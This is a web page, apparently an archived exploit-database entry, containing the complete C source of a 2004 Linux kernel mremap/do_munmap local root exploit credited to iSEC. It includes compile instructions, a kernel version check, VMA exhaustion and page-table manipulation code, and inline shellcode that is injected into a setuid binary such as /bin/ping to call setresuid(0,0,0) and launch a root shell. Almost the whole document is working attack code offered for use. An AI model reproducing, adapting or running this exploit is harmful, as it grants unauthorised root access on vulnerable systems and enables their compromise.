<html><head><title>Linux Kernel 2.x mremap missing do_munmap Exploit
</title></head><pre>/*
 *
 *	mremap missing do_munmap return check kernel exploit
 *
 *	gcc -O3 -static -fomit-frame-pointer mremap_pte.c -o mremap_pte
 *	./mremap_pte [suid] [[shell]]
 *	
 *	Vulnerable kernel versions are all &lt;= 2.2.25, &lt;= 2.4.24 and &lt;= 2.6.2
 *
 *	Copyright (c) 2004  iSEC Security Research. All Rights Reserved.
 *
 *	THIS PROGRAM IS FOR EDUCATIONAL PURPOSES *ONLY* IT IS PROVIDED &quot;AS IS&quot;
 *	AND WITHOUT ANY WARRANTY. COPYING, PRINTING, DISTRIBUTION, MODIFICATION
 *	WITHOUT PERMISSION OF THE AUTHOR IS STRICTLY PROHIBITED.
 *
 */

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;errno.h&gt;
#include &lt;unistd.h&gt;
#include &lt;syscall.h&gt;
#include &lt;signal.h&gt;
#include &lt;time.h&gt;
#include &lt;sched.h&gt;

#include &lt;sys/mman.h&gt;
#include &lt;sys/wait.h&gt;
#include &lt;sys/utsname.h&gt;

#include &lt;asm/page.h&gt;


#define str(s) #s
#define xstr(s) str(s)

//	this is for standard kernels with 3/1 split
#define STARTADDR	0x40000000
#define PGD_SIZE	(PAGE_SIZE * 1024)
#define VICTIM		(STARTADDR + PGD_SIZE)
#define MMAP_BASE	(STARTADDR + 3*PGD_SIZE)

#define DSIGNAL		SIGCHLD
#define CLONEFL		(DSIGNAL|CLONE_VFORK|CLONE_VM)

#define MREMAP_MAYMOVE	( (1UL) &lt;&lt; 0 )
#define MREMAP_FIXED	( (1UL) &lt;&lt; 1 )

#define __NR_sys_mremap	__NR_mremap


//	how many ld.so pages? this is the .text section length (like cat 	
//	/proc/self/maps) in pages
#define LINKERPAGES	0x14

//	suid victim
static char *suid=&quot;/bin/ping&quot;;

//	shell to start
static char *launch=&quot;/bin/bash&quot;;


_syscall5(ulong, sys_mremap, ulong, a, ulong, b, ulong, c, ulong, d, 		
	  ulong, e);
unsigned long sys_mremap(unsigned long addr, unsigned long old_len, 
			 unsigned long new_len, unsigned long flags, 
			 unsigned long new_addr);

static volatile unsigned base, *t, cnt, old_esp, prot, victim=0;
static int i, pid=0;
static char *env[2], *argv[2];
static ulong ret;


//	code to appear inside the suid image
static void suid_code(void)
{
__asm__(
	&quot;		call	callme				\n&quot;

//	setresuid(0, 0, 0), setresgid(0, 0, 0)
	&quot;jumpme:	xorl	%ebx, %ebx			\n&quot;
	&quot;		xorl	%ecx, %ecx			\n&quot;
	&quot;		xorl	%edx, %edx			\n&quot;
	&quot;		xorl	%eax, %eax			\n&quot;
	&quot;		mov	$&quot;xstr(__NR_setresuid)&quot;, %al	\n&quot;
	&quot;		int	$0x80				\n&quot;
	&quot;		mov	$&quot;xstr(__NR_setresgid)&quot;, %al	\n&quot;
	&quot;		int	$0x80				\n&quot;

//	execve(launch)
	&quot;		popl	%ebx				\n&quot;
	&quot;		andl	$0xfffff000, %ebx		\n&quot;
	&quot;		xorl	%eax, %eax			\n&quot;
	&quot;		pushl	%eax				\n&quot;
	&quot;		movl	%esp, %edx			\n&quot;
	&quot;		pushl	%ebx				\n&quot;
	&quot;		movl	%esp, %ecx			\n&quot;
	&quot;		mov	$&quot;xstr(__NR_execve)&quot;, %al	\n&quot;
	&quot;		int	$0x80				\n&quot;

//	exit
	&quot;		xorl	%eax, %eax			\n&quot;
	&quot;		mov	$&quot;xstr(__NR_exit)&quot;, %al		\n&quot;
	&quot;		int	$0x80				\n&quot;

	&quot;callme:	jmp	jumpme				\n&quot;
	);
}


static int suid_code_end(int v)
{
return v+1;
}


static inline void get_esp(void)
{
__asm__(
	&quot;		movl	%%esp, %%eax			\n&quot;
	&quot;		andl	$0xfffff000, %%eax		\n&quot;
	&quot;		movl	%%eax, %0			\n&quot;
	: : &quot;m&quot;(old_esp)
	);
}


static inline void cloneme(void)
{
__asm__(
	&quot;		pusha					\n&quot;
	&quot;		movl $(&quot;xstr(CLONEFL)&quot;), %%ebx		\n&quot;
	&quot;		movl %%esp, %%ecx			\n&quot;
	&quot;		movl $&quot;xstr(__NR_clone)&quot;, %%eax		\n&quot;
	&quot;		int  $0x80				\n&quot;
	&quot;		movl %%eax, %0				\n&quot;
	&quot;		popa					\n&quot;
	: : &quot;m&quot;(pid)
	);
}


static inline void my_execve(void)
{
__asm__(
	&quot;		movl %1, %%ebx				\n&quot;
	&quot;		movl %2, %%ecx				\n&quot;
	&quot;		movl %3, %%edx				\n&quot;
	&quot;		movl $&quot;xstr(__NR_execve)&quot;, %%eax	\n&quot;
	&quot;		int  $0x80				\n&quot;
	: &quot;=a&quot;(ret)
	: &quot;m&quot;(suid), &quot;m&quot;(argv), &quot;m&quot;(env)
	);
}


static inline void pte_populate(unsigned addr)
{
unsigned r;
char *ptr;

	memset((void*)addr, 0x90, PAGE_SIZE);
	r = ((unsigned)suid_code_end) - ((unsigned)suid_code);
	ptr = (void*) (addr + PAGE_SIZE);
	ptr -= r+1;
	memcpy(ptr, suid_code, r);
	memcpy((void*)addr, launch, strlen(launch)+1);
}


//	hit VMA limit &amp; populate PTEs
static void exhaust(void)
{
//	mmap PTE donor
	t = mmap((void*)victim, PAGE_SIZE*(LINKERPAGES+3), PROT_READ|PROT_WRITE,
		  MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0);
	if(MAP_FAILED==t)
		goto failed;

//	prepare shell code pages
	for(i=2; i&lt;LINKERPAGES+1; i++)
		pte_populate(victim + PAGE_SIZE*i);
	i = mprotect((void*)victim, PAGE_SIZE*(LINKERPAGES+3), PROT_READ);
	if(i)
		goto failed;

//	lock unmap
	base = MMAP_BASE;
	cnt = 0;
	prot = PROT_READ;
	printf(&quot;\n&quot;); fflush(stdout);
	for(;;) {
		t = mmap((void*)base, PAGE_SIZE, prot, 
			 MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 0);
		if(MAP_FAILED==t) {
			if(ENOMEM==errno)
				break;
			else
				goto failed;
		}
		if( !(cnt%512) || cnt&gt;65520 )
			printf(&quot;\r    MMAP #%d  0x%.8x - 0x%.8lx&quot;, cnt, base,
			base+PAGE_SIZE); fflush(stdout);
		base += PAGE_SIZE;
		prot ^= PROT_EXEC;
		cnt++;
	}

//	move PTEs &amp; populate page table cache
	ret = sys_mremap(victim+PAGE_SIZE, LINKERPAGES*PAGE_SIZE, PAGE_SIZE,	
			 MREMAP_FIXED|MREMAP_MAYMOVE, VICTIM);
	if(-1==ret)
		goto failed;

	munmap((void*)MMAP_BASE, old_esp-MMAP_BASE);
	t = mmap((void*)(old_esp-PGD_SIZE-PAGE_SIZE), PAGE_SIZE, 		
		 PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS|MAP_FIXED, 0, 
		 0);
	if(MAP_FAILED==t)
		goto failed;

	*t = *((unsigned *)old_esp);
	munmap((void*)VICTIM-PAGE_SIZE, old_esp-(VICTIM-PAGE_SIZE));
	printf(&quot;\n[+] Success\n\n&quot;); fflush(stdout);
	return;

failed:
	printf(&quot;\n[-] Failed\n&quot;); fflush(stdout);
	_exit(0);
}


static inline void check_kver(void)
{
static struct utsname un;
int a=0, b=0, c=0, v=0, e=0, n;

	uname(&amp;un);
	n=sscanf(un.release, &quot;%d.%d.%d&quot;, &amp;a, &amp;b, &amp;c);
	if(n!=3 || a!=2) {
		printf(&quot;\n[-] invalid kernel version string\n&quot;);
		_exit(0);
	}

	if(b==2) {
		if(c&lt;=25)
			v=1;
	}
	else if(b==3) {
		if(c&lt;=99)
			v=1;
	}
	else if(b==4) {
		if(c&gt;18 &amp;&amp; c&lt;=24)
			v=1, e=1;
		else if(c&gt;24)
			v=0, e=0;
		else
			v=1, e=0;
	}
	else if(b==5 &amp;&amp; c&lt;=75)
		v=1, e=1;
	else if(b==6 &amp;&amp; c&lt;=2)
		v=1, e=1;

	printf(&quot;\n[+] kernel %s  vulnerable: %s  exploitable %s&quot;,
		un.release, v? &quot;YES&quot; : &quot;NO&quot;, e? &quot;YES&quot; : &quot;NO&quot; );
	fflush(stdout);

	if(v &amp;&amp; e)
		return;
	_exit(0);
}


int main(int ac, char **av)
{
//	prepare
	check_kver();
	memset(env, 0, sizeof(env));
	memset(argv, 0, sizeof(argv));
	if(ac&gt;1) suid=av[1];
	if(ac&gt;2) launch=av[2];
	argv[0] = suid;
	get_esp();

//	mmap &amp; clone &amp; execve
	exhaust();
	cloneme();
	if(!pid) {
		my_execve();
	} else {
		waitpid(pid, 0, 0);
	}

return 0;
}

// milw0rm.com [2004-03-01]</pre></html>